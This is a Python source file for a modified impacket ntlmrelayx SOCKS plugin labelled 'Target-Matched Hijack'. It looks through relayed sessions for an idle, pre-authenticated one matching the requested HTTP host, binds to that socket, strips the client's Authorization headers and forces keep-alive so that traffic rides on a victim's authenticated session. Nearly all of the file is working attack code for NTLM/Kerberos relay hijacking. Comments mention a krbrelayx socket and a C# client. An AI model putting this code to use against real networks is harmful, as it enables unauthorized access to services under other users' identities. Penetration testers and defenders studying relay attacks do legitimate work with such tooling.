from impacket import LOG
from impacket.examples.ntlmrelayx.servers.socksserver import SocksRelay

PLUGIN_CLASS = "HTTPSocksRelay"
EOL = b'\r\n'

class HTTPSocksRelay(SocksRelay):
    PLUGIN_NAME = 'HTTP Socks Plugin (Target-Matched Hijack)'
    PLUGIN_SCHEME = 'HTTP'

    def __init__(self, targetHost, targetPort, socksSocket, activeRelays):
        SocksRelay.__init__(self, targetHost, targetPort, socksSocket, activeRelays)
        self.packetSize = 8192

    @staticmethod
    def getProtocolPort():
        return 80

    def initConnection(self):
        pass

    def skipAuthentication(self):
        # Read the first HTTP request
        data = self.socksSocket.recv(self.packetSize)
        if not data:
            return False

        # ---------------------------------------------------------
        # SMART HIJACKING: Iterate active relays to match scheme & netloc
        # ---------------------------------------------------------
        self.username = None
        requested_host = self.targetHost.lower()
        requested_scheme = self.PLUGIN_SCHEME.upper()

        for user, relay_data in self.activeRelays.items():
            protocol_client = relay_data.get('protocolClient')
            
            # Guard against malformed relay entries
            if not protocol_client or not hasattr(protocol_client, 'target'):
                continue
            
            # Extract the relay's actual destination
            relay_scheme = getattr(protocol_client.target, 'scheme', '').upper()
            relay_netloc = getattr(protocol_client.target, 'netloc', '').lower()
            
            # Check if this relay matches the requested target
            if relay_scheme == requested_scheme and requested_host in relay_netloc:
                if not relay_data['inUse']:
                    self.username = user
                    break

        if not self.username:
            LOG.error('HTTP: No idle relays available that match target %s://%s!' % (requested_scheme, requested_host))
            reply = [b'HTTP/1.1 502 Bad Gateway', b'Connection: close', b'', b'']
            self.socksSocket.send(EOL.join(reply))
            return False
        
        LOG.info('HTTP: Proxying client session for %s@%s(%s)' % (
            self.username, self.targetHost, self.targetPort))
        self.session = self.activeRelays[self.username]['protocolClient'].session
        
        # Bind our SOCKS relay socket to the pre-authenticated krbrelayx socket
        self.session = self.activeRelays[self.username]['protocolClient'].session
        self.relaySocket = self.session.sock

        # Prepare and send the initial request to the server over the hijacked socket
        tosend = self.prepareRequest(data)
        self.relaySocket.send(tosend)
        
        # Send the response back to the client
        self.transferResponse()
        return True

    def getHeaders(self, data):
        headerSize = data.find(EOL+EOL)
        headers = data[:headerSize].split(EOL)[1:]
        headers = [header.decode("ascii", errors="ignore") for header in headers]
        headerDict = {hdrKey.split(':')[0].lower():hdrKey.split(':', 1)[1][1:] for hdrKey in headers if ':' in hdrKey}
        return headerDict

    def transferResponse(self):
        data = self.relaySocket.recv(self.packetSize)
        headerSize = data.find(EOL+EOL)
        headers = self.getHeaders(data)
        try:
            bodySize = int(headers['content-length'])
            readSize = len(data)
            self.socksSocket.send(data)
            while readSize < bodySize + headerSize + 4:
                data = self.relaySocket.recv(self.packetSize)
                readSize += len(data)
                self.socksSocket.send(data)
        except KeyError:
            try:
                if headers.get('transfer-encoding') == 'chunked':
                    LOG.debug('Server sent chunked encoding - transferring')
                    self.transferChunked(data, headers)
                else:
                    self.socksSocket.send(data)
            except KeyError:
                self.socksSocket.send(data)

    def transferChunked(self, data, headers):
        headerSize = data.find(EOL+EOL)
        self.socksSocket.send(data[:headerSize + 4])

        body = data[headerSize + 4:]
        if not body: return
            
        datasize_str = body[:body.find(EOL)].decode('ascii', errors='ignore').strip()
        datasize = int(datasize_str, 16) if datasize_str else 0
        
        while datasize > 0:
            bodySize = body.find(EOL) + 2 + datasize + 2
            readSize = len(body)
            self.socksSocket.send(body)
            while readSize < bodySize:
                maxReadSize = bodySize - readSize
                body = self.relaySocket.recv(min(self.packetSize, maxReadSize))
                readSize += len(body)
                self.socksSocket.send(body)
            body = self.relaySocket.recv(self.packetSize)
            datasize_str = body[:body.find(EOL)].decode('ascii', errors='ignore').strip()
            datasize = int(datasize_str, 16) if datasize_str else 0
            
        LOG.debug('Last chunk received - exiting chunked transfer')
        self.socksSocket.send(body)

    def prepareRequest(self, data):
        response = []
        for part in data.split(EOL):
            if part == b'':
                break
            
            # Since we are hijacking an existing session, strip any auth headers 
            # your C# client might accidentally send so they don't break the session
            if b'authorization' in part.lower():
                continue
            
            # Enforce Keep-Alive for connection reuse
            if b'connection: close' in part.lower():
                response.append(b'Connection: Keep-Alive')
                continue
            
            response.append(part)
            
        response.append(b'')
        parts = data.split(EOL+EOL, 1)
        if len(parts) > 1:
            response.append(parts[1])
        else:
            response.append(b'')
            
        senddata = EOL.join(response)

        headerSize = data.find(EOL+EOL)
        headers = self.getHeaders(data)
        try:
            bodySize = int(headers['content-length'])
            readSize = len(data)
            while readSize < bodySize + headerSize + 4:
                data = self.socksSocket.recv(self.packetSize)
                readSize += len(data)
                senddata += data
        except KeyError:
            pass
        return senddata

    def tunnelConnection(self):
        while True:
            data = self.socksSocket.recv(self.packetSize)
            if not data:
                return
            tosend = self.prepareRequest(data)
            self.relaySocket.send(tosend)
            self.transferResponse()